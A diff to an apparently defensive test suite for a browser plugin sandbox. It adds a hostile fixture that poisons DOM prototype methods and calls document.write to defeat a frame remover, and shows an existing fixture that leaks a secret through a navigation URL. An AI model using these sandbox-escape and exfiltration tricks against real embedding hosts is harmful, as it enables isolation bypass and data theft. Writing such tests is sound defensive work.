@@ -80,13 +80,15 @@ const HOSTILE_PLUGIN_HTML = `<!doctype html>
           // contentWindow from here proves nothing: it throws cross-origin
           // whether or not the child has WebRTC. So the child reports from
           // inside its own realm, which is where the attack actually runs.
+          var CHILD =
+            "<script>parent.parent.postMessage({exfil:1,type:'child'," +
+            "tag:'TAG',rtc:typeof RTCPeerConnection},'*');<\\/script>";
           try {
             var realm = document.createElement("iframe");
-            realm.srcdoc =
-              "<script>parent.parent.postMessage({exfil:1,type:'child'," +
-              "rtc:typeof RTCPeerConnection},'*');<\\/script>";
+            realm.srcdoc = CHILD.replace("TAG", "append");
             document.body.appendChild(realm);
           } catch (error) {}
+
 
           fetch(target + "/fetch").then(
             function () { outcomes.fetch = "sent"; },
@@ -112,6 +114,66 @@ const HOSTILE_PLUGIN_HTML = `<!doctype html>
           // The one the guest's own CSP cannot stop.
           location.href = data.base + "/navigate?d=" + encodeURIComponent(data.secret);
         }
+      });
+      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
+    </script>
+  </body>
+</html>`;
+
+/**
+ * Removing child frames is a runtime control, so the interesting attacks are on
+ * the remover rather than on the frames. Both of these beat an earlier version.
+ *
+ * `poison` replaces the DOM methods the sweep uses. Our script runs first, but
+ * anything it resolves at mutation time is the plugin's to redefine by then, so
+ * the observer fires and quietly does nothing.
+ *
+ * `docwrite` calls `document.write()` after load, which implies `document.open()`
+ * and builds a brand new `documentElement`. An observer bound to that node is
+ * left watching something detached.
+ *
+ * Each child reports `typeof RTCPeerConnection` from its own realm — the only
+ * vantage point that proves anything, since the parent's view is decided by the
+ * opaque origin rather than by whether the child has WebRTC.
+ */
+const REMOVER_ATTACK_HTML = `<!doctype html>
+<html>
+  <body>
+    <script>
+      var CHILD = "<script>parent.parent.postMessage({exfil:1,type:'child',tag:'TAG'," +
+        "rtc:typeof RTCPeerConnection},'*');<\\/script>";
+
+      function plant(tag) {
+        var frame = document.createElement("iframe");
+        frame.srcdoc = CHILD.replace("TAG", tag);
+        document.body.appendChild(frame);
+      }
+
+      window.addEventListener("message", function (event) {
+        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
+
+        try {
+          Element.prototype.remove = function () {};
+          Element.prototype.matches = function () { return false; };
+          Element.prototype.querySelectorAll = function () { return []; };
+          Node.prototype.removeChild = function (node) { return node; };
+        } catch (error) {}
+        try { plant("poison"); } catch (error) {}
+
+        try {
+          document.write("<iframe srcdoc=\\"" + CHILD.replace("TAG", "docwrite") + "\\"><\\/iframe>");
+          document.close();
+        } catch (error) {}
+        // After the rewrite the tree is new; plant one more to prove the
+        // observer is still armed on the replacement document.
+        try { plant("after-rewrite"); } catch (error) {}
+
+        // No frame count here on purpose: querySelectorAll is one of the methods
+        // this plugin just poisoned, so counting from inside would report
+        // whatever the attacker wants. The children speak for themselves.
+        setTimeout(function () {
+          window.parent.postMessage({ exfil: 1, type: "swept" }, "*");
+        }, 300);
       });
       window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
     </script>
@@ -281,5 +343,38 @@ describe("a hostile plugin", () => {
     iframe.contentWindow?.postMessage({ exfil: 1, type: "ping" }, "*");
     await sleep(200);
     expect(answered).toBe(false);
+  });
+
+  it("cannot get a child realm by attacking the remover itself", async () => {
+    const childReports: Array<{ tag: string; rtc: string }> = [];
+    let swept = false;
+    const onMessage = (event: MessageEvent) => {
+      if (event.data?.exfil !== 1) {
+        return;
+      }
+      if (event.data.type === "child") {
+        childReports.push({ tag: event.data.tag, rtc: event.data.rtc });
+      }
+      if (event.data.type === "swept") {
+        swept = true;
+      }
+      if (event.data.type === "ready") {
+        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
+      }
+    };
+    window.addEventListener("message", onMessage);
+
+    const iframe = createPluginIframe(REMOVER_ATTACK_HTML);
+    document.body.appendChild(iframe);
+    cleanups.push(() => {
+      window.removeEventListener("message", onMessage);
+      iframe.remove();
+    });
+
+    await waitFor(() => (swept ? true : null), "the remover attack to finish");
+
+    // Any report at all means a child realm reached script execution, and every
+    // such realm hands back a `RTCPeerConnection` the shell never touched.
+    expect(childReports).toEqual([]);
   });
 });
